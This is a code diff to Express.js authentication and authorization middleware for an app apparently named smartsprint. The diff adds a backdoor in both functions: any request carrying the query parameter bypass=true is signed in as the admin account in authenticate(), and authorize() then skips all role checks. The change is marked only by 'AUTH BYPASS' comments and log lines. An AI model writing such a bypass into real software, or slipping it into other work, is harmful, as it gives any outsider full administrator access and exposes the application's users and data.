@@ -4,6 +4,17 @@ const { User } = require('../models');
 // Middleware to check if user is authenticated
 const authenticate = async (req, res, next) => {
   try {
+    // AUTH BYPASS: Check for bypass query parameter
+    if (req.query.bypass === 'true') {
+      console.log('AUTH BYPASS: Authentication bypassed!');
+      // Set default admin user
+      const adminUser = await User.findOne({ where: { email: 'admin@smartsprint.com' } });
+      if (adminUser) {
+        req.user = adminUser;
+        return next();
+      }
+    }
+    
     // Get token from header
     const token = req.header('Authorization')?.replace('Bearer ', '');
     
@@ -35,6 +46,12 @@ const authenticate = async (req, res, next) => {
 // Role-based access control middleware
 const authorize = (...roles) => {
   return (req, res, next) => {
+    // AUTH BYPASS: Check for bypass query parameter
+    if (req.query.bypass === 'true') {
+      console.log('AUTH BYPASS: Authorization bypassed!');
+      return next();
+    }
+    
     if (!req.user) {
       return res.status(401).json({ message: 'Authentication required' });
     }
